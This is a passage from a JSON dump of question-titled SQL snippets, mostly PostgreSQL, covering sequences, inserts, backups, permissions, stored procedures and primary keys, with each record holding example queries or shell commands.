    "title": " postgresql how to show table names",
    "description": "SELECT table_name   FROM information_schema.tables  WHERE table_schema='public'    AND table_type='BASE TABLE'; \n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3276,
    "keyword": null,
    "link": null,
    "title": " postgresql if 0 then 1",
    "description": "-- returns the greatest value, in case 1 select greatest( 0, 1 ) -> 1 -- it also works with null values select greatest( null, 1 ) -> 1\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3277,
    "keyword": null,
    "link": null,
    "title": " postgresql if null then 0",
    "description": "select coalesce(avg(bar), 0) from foo;\n",
    "reg_date": "2021-10-12T09:59:09.000Z"
  },
  {
    "id": 3278,
    "keyword": null,
    "link": null,
    "title": " postgresql import data from csv",
    "description": "copy table from '/home/usama/Documents/columns_rearrange.csv' csv header ;\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3279,
    "keyword": null,
    "link": null,
    "title": " postgresql insert column",
    "description": "ALTER TABLE customers  ADD COLUMN contact_name VARCHAR NOT NULL; \nALTER TABLE table_name ADD COLUMN new_column_name data_type constraint;\nCREATE TABLE my_table ( \tid serial NOT NULL,     user_name text, \tcreated_at timestamp with time zone DEFAULT CURRENT_TIMESTAMP //here )\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3280,
    "keyword": null,
    "link": null,
    "title": " postgresql insert multiple rows",
    "description": "                                     INSERT INTO table_name (column_list) VALUES     (value_list_1),     (value_list_2),     ...     (value_list_n);\nINSERT INTO User (name, surname, \"roomId\") // roomId is with quetes(\"\") because it is case sensitive in this example   VALUES      ('Joe', 'Travolta', 1),     ('Jim', 'Carrey', 2),     ('Shakira', 'whenever', 3); // remember about semicolon(;) at the end\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3281,
    "keyword": null,
    "link": null,
    "title": " postgresql insert select",
    "description": "insert into items_ver(item_id, item_group, name) select * from items where item_id=2;\ninsert into TABLENAMEA (A,B,C,D)  select A,B,C,D from TABLENAMEB \n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3282,
    "keyword": null,
    "link": null,
    "title": " postgresql install ubuntu",
    "description": "sudo apt update sudo apt install postgresql postgresql-contrib  sudo -u postgres createuser --interactive  sudo -u postgres createdb database1\nsudo apt update sudo apt install postgresql postgresql-contrib \nsudo apt-get install postgresql\nsudo apt install postgresql postgresql-contrib \nroot@pooja-virtual-machine:~# apt-get install postgresql-11\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3283,
    "keyword": null,
    "link": null,
    "title": " postgresql isnull with max",
    "description": "SELECT coalesce(field, 'Empty') AS field_alias\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3284,
    "keyword": null,
    "link": null,
    "title": " postgresql la fonction dblink connect(unknown, unknown) n'existe pas",
    "description": "create extension dblink;\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3285,
    "keyword": null,
    "link": null,
    "title": " postgresql last 12 rows",
    "description": "SELECT ... LIMIT 12;\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3286,
    "keyword": null,
    "link": null,
    "title": " postgresql left join distinct on",
    "description": "Select Distinct On (u.username, u.email)      u.username     ,u.email     ,l.browser     ,l.login_time From users u Join logins l On l.username = u.username Order By u.username, u.email, login_time Desc                                           ^ \n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3287,
    "keyword": null,
    "link": null,
    "title": " postgresql like",
    "description": "                                     SELECT \tfirst_name,         last_name FROM \tcustomer WHERE \tfirst_name LIKE 'Jen%';\n",
    "reg_date": "2021-10-12T09:59:10.000Z"
  },
  {
    "id": 3288,
    "keyword": null,
    "link": null,
    "title": " postgresql like case-insensitive",
    "description": "using ILIKE instead of LIKE\n-- Postgresql case insensitive: SELECT * FROM people WHERE name ILIKE 'JOHN' -- John -- JOHN -- john\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3289,
    "keyword": null,
    "link": null,
    "title": " postgresql limit",
    "description": "SELECT select_list     FROM table_expression     LIMIT number OFFSET number \nSELECT expressionsFROM tables[WHERE conditions][ORDER BY expression [ ASC | DESC ]]LIMIT row_count;\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3290,
    "keyword": null,
    "link": null,
    "title": " postgresql linux password",
    "description": "postgres=# ALTER USER postgres PASSWORD 'myPassword'; ALTER ROLE \n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3291,
    "keyword": null,
    "link": null,
    "title": " postgresql list columns",
    "description": "SELECT * FROM information_schema.columns  WHERE table_schema = 'your_schema'   AND table_name = 'your_table';\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3292,
    "keyword": null,
    "link": null,
    "title": " postgresql list db",
    "description": "postgres=# \\l\nList all databases: \\l\npostgres=# \\l \n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3293,
    "keyword": null,
    "link": null,
    "title": " postgresql list extensions",
    "description": "Postgres Shell:  \\dx  SQL:  SELECT * FROM pg_extension\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3294,
    "keyword": null,
    "link": null,
    "title": " postgresql list users",
    "description": "postgres=# \\du\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3295,
    "keyword": null,
    "link": null,
    "title": " postgresql make each element in array distinct",
    "description": "SELECT ARRAY(SELECT DISTINCT unnest(t_column)) FROM t_name;\nSELECT ARRAY(SELECT DISTINCT e FROM unnest(ARRAY[a,b,c,d]) AS a(e)) FROM ( VALUES   ('foo', 'bar', 'foo', 'baz' ) ) AS t(a,b,c,d);\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3296,
    "keyword": null,
    "link": null,
    "title": " postgresql must appear in the group by clause or be used in an aggregate function",
    "description": "Try using \"DISTINCT\" instead of \"GROUP BY\"\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3297,
    "keyword": null,
    "link": null,
    "title": " postgresql newline character",
    "description": "chr(10)\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3298,
    "keyword": null,
    "link": null,
    "title": " postgresql not in",
    "description": "SELECT * FROM public.queries where status_id not in (4,5,6)\n",
    "reg_date": "2021-10-12T09:59:11.000Z"
  },
  {
    "id": 3299,
    "keyword": null,
    "link": null,
    "title": " postgresql parse json array",
    "description": "SELECT array_to_json(array_col) as array_col FROM t_name;\n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3300,
    "keyword": null,
    "link": null,
    "title": " postgresql partition group by",
    "description": "SELECT      product_id,     product_name, \tgroup_id,     price,     FIRST_VALUE(product_name)      OVER( \tPARTITION BY group_id         ORDER BY price         RANGE BETWEEN              UNBOUNDED PRECEDING AND              UNBOUNDED FOLLOWING     ) lowest_price FROM      products;\n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3301,
    "keyword": null,
    "link": null,
    "title": " postgresql pg dump",
    "description": "pg_dump -U user -d db_name -h 127.0.0.1 > dump.sql \npg_dump -U username dbname > dbexport.pgsql \n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3302,
    "keyword": null,
    "link": null,
    "title": " postgresql print sessions using the database",
    "description": "select pid as process_id,         usename as username,         datname as database_name,         client_addr as client_address,         application_name,        backend_start,        state,        state_change from pg_stat_activity;\n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3303,
    "keyword": null,
    "link": null,
    "title": " postgresql print variable",
    "description": "raise notice 'Value: %', deletedContactId; \n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3304,
    "keyword": null,
    "link": null,
    "title": " postgresql procedure example",
    "description": "                                     create [or replace] procedure procedure_name(parameter_list) language plpgsql as $$ declare -- variable declaration begin -- stored procedure body end; $$\nSELECT n.nspname AS schema       ,proname AS fname       ,proargnames AS args       ,t.typname AS return_type       ,d.description       ,pg_get_functiondef(p.oid) as definition --      ,CASE WHEN NOT p.proisagg THEN pg_get_functiondef(p.oid) --            ELSE 'pg_get_functiondef() can''t be used with aggregate functions' --       END as definition   FROM pg_proc p   JOIN pg_type t     ON p.prorettype = t.oid   LEFT OUTER   JOIN pg_description d     ON p.oid = d.objoid   LEFT OUTER   JOIN pg_namespace n     ON n.oid = p.pronamespace  WHERE NOT p.proisagg    AND n.nspname~'<$SCHEMA_NAME_PATTERN>'    AND proname~'<$FUNCTION_NAME_PATTERN>' \n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3305,
    "keyword": null,
    "link": null,
    "title": " postgresql psycopg2 select single value",
    "description": "#!/usr/bin/env python # -*- coding: utf-8 -*-  import psycopg2 import sys  con = None  try:      con = psycopg2.connect(database='testdb', user='postgres',         password='s$cret')      cur = con.cursor()     cur.execute('SELECT version()')      version = cur.fetchone()[0]     print(version)  except psycopg2.DatabaseError as e:      print(f'Error {e}')     sys.exit(1)  finally:      if con:         con.close() \n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3306,
    "keyword": null,
    "link": null,
    "title": " postgresql raise exception",
    "description": "-- Simple exception: RAISE EXCEPTION 'This user role does not exist.';  -- This example will abort the transaction with the given error message and  -- hint: RAISE EXCEPTION 'Nonexistent ID --> %', user_id       USING HINT = 'Please check your user ID';  -- These two examples show equivalent ways of setting the SQLSTATE: RAISE 'Duplicate user ID: %', user_id USING ERRCODE = 'unique_violation'; RAISE 'Duplicate user ID: %', user_id USING ERRCODE = '23505';  -- There is a second RAISE syntax in which the main argument is the condition  -- name or SQLSTATE to be reported, for example: RAISE division_by_zero; RAISE SQLSTATE '22012';  -- In this syntax, USING can be used to supply a custom error message, detail,  -- or hint. Another way to do the earlier example is RAISE unique_violation USING MESSAGE = 'Duplicate user ID: ' || user_id;\n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3307,
    "keyword": null,
    "link": null,
    "title": " postgresql random number",
    "description": "CREATE OR REPLACE FUNCTION random_between(low INT ,high INT)     RETURNS INT AS $$ BEGIN    RETURN floor(random()* (high-low + 1) + low); END; $$ language 'plpgsql' STRICT;\nSELECT floor(random() * (h-l+1) + l)::int;\ninsert into towns (     code, article, name, department ) select     left(md5(i::text), 10),     md5(random()::text),     md5(random()::text),     left(md5(random()::text), 4) from generate_series(1, 1000000) s(i) \n",
    "reg_date": "2021-10-12T09:59:12.000Z"
  },
  {
    "id": 3308,
    "keyword": null,
    "link": null,
    "title": " postgresql remove duplicate rows 2 columns",
    "description": "DELETE FROM sf_table WHERE id IN     (SELECT id     FROM          (SELECT id,          ROW_NUMBER() OVER( PARTITION BY tosp, icd         ORDER BY  id ) AS row_num         FROM sf_table ) t         WHERE t.row_num > 1 );\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3309,
    "keyword": null,
    "link": null,
    "title": " postgresql remove not null constraint",
    "description": "alter table users alter column email drop not null; \nads character varying(60) NOT NULL CHECK (ads <> '')\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3310,
    "keyword": null,
    "link": null,
    "title": " postgresql reset auto increment",
    "description": "-- if you dont mind losing the data, do the following TRUNCATE TABLE someTable RESTART IDENTITY;\n-- Change the starting value of the sequence  ALTER SEQUENCE project_id_seq RESTART 3000;  -- Same but dynamic :  SELECT SETVAL('project_id_seq', (SELECT MAX(id) + 1 FROM project));\nALTER SEQUENCE product_id_seq RESTART WITH 1453\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3311,
    "keyword": null,
    "link": null,
    "title": " postgresql reset auto increment index",
    "description": "-- Change the starting value of the sequence  ALTER SEQUENCE project_id_seq RESTART 3000;  -- Same but dynamic :  SELECT SETVAL('project_id_seq', (SELECT MAX(id) + 1 FROM project));\nALTER SEQUENCE product_id_seq RESTART WITH 1453\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3312,
    "keyword": null,
    "link": null,
    "title": " postgresql reset sequence",
    "description": "ALTER SEQUENCE <tablename>_<id>_seq RESTART WITH 1 \nalter sequence <tableName>_id_seq restart with 1; For an instance, we have a table named \"groups\" and we need to reset the id sequence with 1.  alter sequence groups_id_seq restart with 1;\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3313,
    "keyword": null,
    "link": null,
    "title": " postgresql reset serial counter after deleting content",
    "description": "ALTER SEQUENCE product_id_seq RESTART WITH 1453\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3314,
    "keyword": null,
    "link": null,
    "title": " postgresql resolv duplicate value violates unique constraint",
    "description": "SELECT setval(pg_get_serial_sequence('users', 'id'), coalesce(max(id)+1, 1), false) FROM users; \n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3315,
    "keyword": null,
    "link": null,
    "title": " postgresql restore from dump",
    "description": "psql -U postgres -h localhost -p 5432 -f data_dump.sql\n#To dump a database called mydb into a SQL-script file: pg_dump mydb > db.sql  #To reload such a script into a (freshly created) database named newdb: psql -d newdb -f db.sql\n",
    "reg_date": "2021-10-12T09:59:13.000Z"
  },
  {
    "id": 3316,
    "keyword": null,
    "link": null,
    "title": " postgresql round double precision",
    "description": "SELECT ROUND(some_value::numeric ,2)\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3317,
    "keyword": null,
    "link": null,
    "title": " postgresql search all tables for column name",
    "description": "select t.table_schema,        t.table_name from information_schema.tables t inner join information_schema.columns c on c.table_name = t.table_name                                  and c.table_schema = t.table_schema where c.column_name = 'last_name'       and t.table_schema not in ('information_schema', 'pg_catalog')       and t.table_type = 'BASE TABLE' order by t.table_schema; Code has been copied\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3318,
    "keyword": null,
    "link": null,
    "title": " postgresql select all column names",
    "description": "SELECT *   FROM information_schema.columns  WHERE table_schema = 'your_schema'    AND table_name   = 'your_table'      ;\nSELECT column_names   FROM information_schema.columns  WHERE table_schema = 'your_schema'    AND table_name   = 'your_table'      ; -- just for column names\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3319,
    "keyword": null,
    "link": null,
    "title": " postgresql select database",
    "description": "\\c databasename;\n\\c dev_db\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3320,
    "keyword": null,
    "link": null,
    "title": " postgresql server restart",
    "description": "sudo service postgresql restart # To restart the postgresql service\nsudo service postgresql start\nsudo /etc/init.d/postgresql restart\n                                                     pg_ctl -D \"C:\\Program Files\\PostgreSQL\\12\\data\" restartCode language: JavaScript (javascript)\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3321,
    "keyword": null,
    "link": null,
    "title": " postgresql show current database",
    "description": "SELECT current_database();\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3322,
    "keyword": null,
    "link": null,
    "title": " postgresql sql query comment",
    "description": "-- comment goes here\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3323,
    "keyword": null,
    "link": null,
    "title": " postgresql string agg",
    "description": "     STRING_AGG ( expression, separator [order_by_clause] )\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3324,
    "keyword": null,
    "link": null,
    "title": " postgresql substring",
    "description": "SELECT substring('w3resource' from 4 for 5);\nSELECT employee_id,first_name, substring(first_name,1,4) FROM employees;\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3325,
    "keyword": null,
    "link": null,
    "title": " postgresql substring last",
    "description": "SELECT RIGHT('XYZ', 2);\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3326,
    "keyword": null,
    "link": null,
    "title": " postgresql today - 1 year",
    "description": "select now() - INTERVAL '1 YEAR';\n",
    "reg_date": "2021-10-12T09:59:14.000Z"
  },
  {
    "id": 3327,
    "keyword": null,
    "link": null,
    "title": " postgresql transaction",
    "description": "BEGIN; UPDATE accounts SET balance = balance - 100.00     WHERE name = 'Alice'; SAVEPOINT my_savepoint; UPDATE accounts SET balance = balance + 100.00     WHERE name = 'Bob'; -- oops ... forget that and use Wally's account ROLLBACK TO my_savepoint; UPDATE accounts SET balance = balance + 100.00     WHERE name = 'Wally'; COMMIT;\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3328,
    "keyword": null,
    "link": null,
    "title": " postgresql transaction discard all",
    "description": "ROLLBACK;\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3329,
    "keyword": null,
    "link": null,
    "title": " postgresql truncate cascade restart identity",
    "description": "TRUNCATE <table_name> RESTART IDENTITY CASCADE; --RESTART will reset the identity sequence --CASCADE all tables that have a foreign key reference to  --table_name will be truncated as well\nTRUNCATE bigtable, fattable RESTART IDENTITY;\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3330,
    "keyword": null,
    "link": null,
    "title": " postgresql update auto increment value",
    "description": "ALTER SEQUENCE product_id_seq RESTART WITH 1453\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3331,
    "keyword": null,
    "link": null,
    "title": " postgresql update sequence next value",
    "description": "ALTER SEQUENCE seq_name RESTART WITH 22;\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3332,
    "keyword": null,
    "link": null,
    "title": " postgresql update to unique",
    "description": "ALTER TABLE foo ADD UNIQUE (thecolumn); \n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3333,
    "keyword": null,
    "link": null,
    "title": " postgresql user permissions to database",
    "description": "sudo -u postgres psqlpostgres=# create database mydb;postgres=# create user myuser with encrypted password 'mypass';postgres=# grant all privileges on database mydb to myuser;\nsudo -u postgres  psqlpostgres=# create database mydb; postgres=# create user myuser with encrypted password 'mypass'; postgres=# grant all privileges on database mydb to myuser;\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3334,
    "keyword": null,
    "link": null,
    "title": " postgresql version command",
    "description": "psql --version\n# SSH psql --version # SQL SELECT version();\nSELECT version();\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3335,
    "keyword": null,
    "link": null,
    "title": " postgresql where datetrunc month and year equal",
    "description": "... WHERE date_trunc('month', b.col) = date_trunc('month', a.col);\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3336,
    "keyword": null,
    "link": null,
    "title": " postgresql with example",
    "description": "With CTE AS (Select  ID , NAME , AGE , ADDRESS , SALARY FROM COMPANY ) Select * From CTE;\n",
    "reg_date": "2021-10-12T09:59:15.000Z"
  },
  {
    "id": 3337,
    "keyword": null,
    "link": null,
    "title": " postgress append string in select",
    "description": "SELECT    'Concatenation' || ' ' || 'Operator' AS result_string;\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3338,
    "keyword": null,
    "link": null,
    "title": " power query concatenate",
    "description": "= [TextColumn] & Date.ToText([DateColumn]) & Number.ToText([NumberColumn])\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3339,
    "keyword": null,
    "link": null,
    "title": " primary key reset in SQL database",
    "description": "DBCC CHECKIDENT('TableName',Reseed,0)\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3340,
    "keyword": null,
    "link": null,
    "title": " primary key sql",
    "description": "A primary key allows each record in a table to be uniquely identified. There can only be one primary key per table, and you can assign this constraint to any single or combination of columns. However, this means each value within this column(s) must be unique. Typically in a table, the primary key is an ID column, and is usually paired with the AUTO_ INCREMENT keyword. This means the value increases automatically as new records are created. CREATE TABLE users ( id int NOT NULL AUTO_INCREMENT, first_name varchar(255), last_name varchar(255) NOT NULL, address varchar(255), email varchar(255), PRIMARY KEY (id) );\n/* A primary key allows each record in a table to be uniquely identified. There can only be one primary key per table, and you can assign this constraint to any single or combination of columns. However, this means each value within this column(s) must be unique. Typically in a table, the primary key is an ID column, and is usually paired with the AUTO_ INCREMENT keyword. This means the value increases automatically as new records are created. */ CREATE TABLE stats(id INT NOT NULL PRIMARY KEY, name TEXT)\nA primary key is a field in a table which uniquely identifies each row/record in a database table. Primary keys must contain unique values. A primary key column cannot have NULL values.  A table can have only one primary key, which may consist of single or multiple fields. When multiple fields are used as a primary key, they are called a composite key.  If a table has a primary key defined on any field(s), then you cannot have two records having the same value of that field(s).\n-- NOTE: this is for SQL-Oracle specifically  -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner;  -- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner; \nPRIMARY KEY    -- unique identifier for the entire row of record in a table    --  can not be null and must be unique \nCREATE TABLE student  (  Roll integer (15) NOT NULL PRIMARY KEY,  Name varchar (255),  Class varchar (255),  Contact No varchar (255),  );\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3341,
    "keyword": null,
    "link": null,
    "title": " primary key vs foreign key",
    "description": "Primary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table  Unique Key: Only unique value and also can contain NULL\nPrimary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table  Unique Key: Only unique value and also can contain NULL     \nPrimaryKey:-  A primary key constrain is a column or group of columns that uniquely identifies every row in the table of the relational database management system.  It cannot be a duplicate, meaning the same value should not appear more than once in the table.  Foreign key:- A table can have more than one primary key.  Primary key can be defined at the column or the table level. If you create a composite primary key, it should be defined at the table level. Foreign key is a column that creates a relationship between two tables. The purpose of the Foreign key is to maintain data integrity and allow navigation between two different instances of an entity. It acts as a cross-reference between two tables as it references the primary key of another table.  Every relationship in the database should be supported by a foreign key.\nprimary key and foreign key\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3342,
    "keyword": null,
    "link": null,
    "title": " primary key with prefix sql",
    "description": "create table  #test ( Id int identity(1,1), Pid as 'PRE-'+REPLACE(STR(id, 7), SPACE(1), '0') )   INSERT INTO #test DEFAULT VALUES INSERT INTO #test DEFAULT VALUES select *From #test\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3343,
    "keyword": null,
    "link": null,
    "title": " print all records of table in mysql",
    "description": "SELECT * FROM TABLE_NAME; OR SELECT column_name_1, column_name_2 FROM TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3344,
    "keyword": null,
    "link": null,
    "title": " print in pl sql",
    "description": "dbms_output.put_line(\"YOUR MESSAGE\"); \n-- EXAMPLE SET SERVEROUTPUT ON; BEGIN DBMS_OUTPUT.PUT_LINE('This is printed. '||'This is concatenated and printed too!'); END; /\ndbms_output.put_line('Hello Reader!');\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3345,
    "keyword": null,
    "link": null,
    "title": " print integer and string in SQL",
    "description": "declare @x INT = 1 /* Declares an integer variable named \"x\" with the value of 1 */      PRINT 'There are ' + CAST(@x AS VARCHAR) + ' alias combinations did not match a record' /* Prints a string concatenated with x casted as a varchar */ \nprint 'There are ' + cast(@Number as varchar) + ' alias combinations did not match a record'\nprint 'There are ' + convert(varchar,@Number) + ' alias combinations did not match a record'\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3346,
    "keyword": null,
    "link": null,
    "title": " print mysql",
    "description": "SELECT 'some text' as '';  Example:  mysql>SELECT 'some text' as ''; +-----------+ |           | +-----------+ | some text | +-----------+ 1 row in set (0.00 sec) \n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3347,
    "keyword": null,
    "link": null,
    "title": " print pl sql",
    "description": "dbms_output.put_line(\"YOUR MESSAGE\"); \ndbms_output.put_line('hello world!'); \n-- EXAMPLE SET SERVEROUTPUT ON; BEGIN DBMS_OUTPUT.PUT_LINE('This is printed. '||'This is concatenated and printed too!'); END; /\ndbms_output.put_line('Hello Reader!');\n",
    "reg_date": "2021-10-12T09:59:16.000Z"
  },
  {
    "id": 3348,
    "keyword": null,
    "link": null,
    "title": " print year of a date sql",
    "description": "SELECT EXTRACT(YEAR FROM CURRENT_DATE)\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3349,
    "keyword": null,
    "link": null,
    "title": " prisma transaction",
    "description": "const [posts, totalPosts] = await prisma.$transaction([   prisma.post.findMany({ where: { title: { contains: 'prisma' } } }),     prisma.post.count(), ])\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3350,
    "keyword": null,
    "link": null,
    "title": " procedure in sql",
    "description": "-Stored procedure is a group of SQL statements that has been created  and stored in the database. -A stored procedure will accept input  parameters so that a single procedure can be used over the network by several clients using different input data. -A stored procedures will reduce network traffic and increase the performance.  If we modify a stored procedure all the clients will get the updated stored procedure.  Sample of creating a stored procedure CREATE PROCEDURE test_display AS SELECT FirstName, LastName FROM tb_test EXEC test_display\nIF OBJECT_ID ( 'Production.uspGetList', 'P' ) IS NOT NULL        DROP PROCEDURE Production.uspGetList;   GO   CREATE PROCEDURE Production.uspGetList @Product varchar(40)        , @MaxPrice money        , @ComparePrice money OUTPUT       , @ListPrice money OUT   AS       SET NOCOUNT ON;       SELECT p.[Name] AS Product, p.ListPrice AS 'List Price'       FROM Production.Product AS p       JOIN Production.ProductSubcategory AS s          ON p.ProductSubcategoryID = s.ProductSubcategoryID       WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice;   -- Populate the output variable @ListPprice.   SET @ListPrice = (SELECT MAX(p.ListPrice)           FROM Production.Product AS p           JOIN  Production.ProductSubcategory AS s              ON p.ProductSubcategoryID = s.ProductSubcategoryID           WHERE s.[Name] LIKE @Product AND p.ListPrice < @MaxPrice);   -- Populate the output variable @compareprice.   SET @ComparePrice = @MaxPrice;   GO   \nSQL Stored Procedure\nCREATE OR REPLACE PROCEDURE my_scheme.my_procedure(param1 IN VARCHAR2) IS     cnumber NUMBER; BEGIN     cnumber := 10;     INSERT INTO my_table (num_field) VALUES (param1 + cnumber);     COMMIT; EXCEPTION     WHEN OTHERS THEN         raise_application_error(-20001, 'An error was encountered - '             || sqlcode || ' -ERROR- ' || sqlerrm); END;\nCREATE PROCEDURE nome_procedura [(parametri)] IS \tDefinizioni; BEGIN \tCorpo procedura; END;\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3351,
    "keyword": null,
    "link": null,
    "title": " procedures in pl sql",
    "description": "CREATE [OR REPLACE] PROCEDURE procedure_name  [(parameter_name [IN | OUT | IN OUT] type [, ...])]  {IS | AS}  BEGIN    < procedure_body >  END procedure_name; \nCREATE PROCEDURE nome_procedura [(parametri)] IS \tDefinizioni; BEGIN \tCorpo procedura; END;\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3352,
    "keyword": null,
    "link": null,
    "title": " procedures sql insert mysql",
    "description": "mysql> DELIMITER // ; mysql> Create PROCEDURE insert_studentinfo(IN p_id int, IN p_name varchar(20),IN p_Address Varchar(20), IN p_subject Varchar(20))     -> BEGIN     -> insert into student_info(id, name, address, subject) values (p_id, p_name,p_address, p_subject);     -> END // Query OK, 0 rows affected (0.09 sec)\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3353,
    "keyword": null,
    "link": null,
    "title": " psql: FATAL: Ident authentication failed for user \"postgres\"",
    "description": "$ sudo -u postgres psql \\password Enter password: ... ...\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3354,
    "keyword": null,
    "link": null,
    "title": " psql: error: FATAL: role \"postgres\" does not exist",
    "description": "createuser -U postgres -s YOURUSERNAME createdb YOURUSERNAME\ntemplate1=# CREATE USER username WITH PASSWORD 'user_password'; template1=# GRANT ALL PRIVILEGES ON DATABASE \"user_database\" to username;\n",
    "reg_date": "2021-10-12T09:59:17.000Z"
  },
  {
    "id": 3355,
    "keyword": null,
    "link": null,
    "title": " psql: error: could not connect to server: received invalid response to ssl negotiation: h",
